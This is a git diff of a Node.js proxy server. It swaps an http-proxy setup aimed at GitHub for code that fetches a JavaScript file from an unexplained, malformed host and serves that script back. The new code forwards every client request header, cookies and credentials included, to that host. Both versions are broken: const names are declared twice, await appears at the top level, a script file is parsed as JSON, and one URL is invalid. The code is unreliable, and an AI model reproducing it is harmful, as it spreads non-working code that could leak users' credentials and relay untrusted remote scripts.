@@ -1,34 +1,34 @@
 const http = require('http');
-const httpProxy = require('http-proxy');
-
-const proxy = httpProxy.createProxyServer({});
+const fetch = require('node-fetch');
 
 const server = http.createServer((req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  proxy.web(req, res, {
-    target: 'https://raw.githubusercontent.com',
-    changeOrigin: true
-  });
+  const options = {
+    method: req.method,
+    headers: req.headers,
+    redirect: 'follow'
+  };
+
+  const url = 'https://neededaafttwl/epicthing.js';
+
+  fetch(url, options)
+    .then(response => response.text())
+    .then(data => {
+      res.writeHead(200, {
+        'Content-Type': 'application/javascript'
+      });
+      res.write(data);
+      res.end();
+    })
+    .catch(error => {
+      console.error(error);
+      res.writeHead(500, {
+        'Content-Type': 'text/plain'
+      });
+      res.write('An error occurred while fetching the data');
+      res.end();
+    });
 });
 
 server.listen(3000);
 console.log('Proxy server listening on port 3000');
-const response = await fetch('https://raw.githubusercontent.com/iakzs/aafktwl/main/tkns/vat.js');
-const data = await response.json();
-console.log(data);
 
-const proxy = httpProxy.createProxyServer({});
-
-const server = http.createServer((req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  proxy.web(req, res, {
-    target: 'https://github.com',
-    changeOrigin: true
-  });
-});
-
-server.listen(3000);
-console.log('Proxy server listening on port 3000');
-const response = await fetch('https://github.com/iakzs/aafktwl/raw/main/tkns/vat.js');
-const data = await response.json();
-console.log(data);
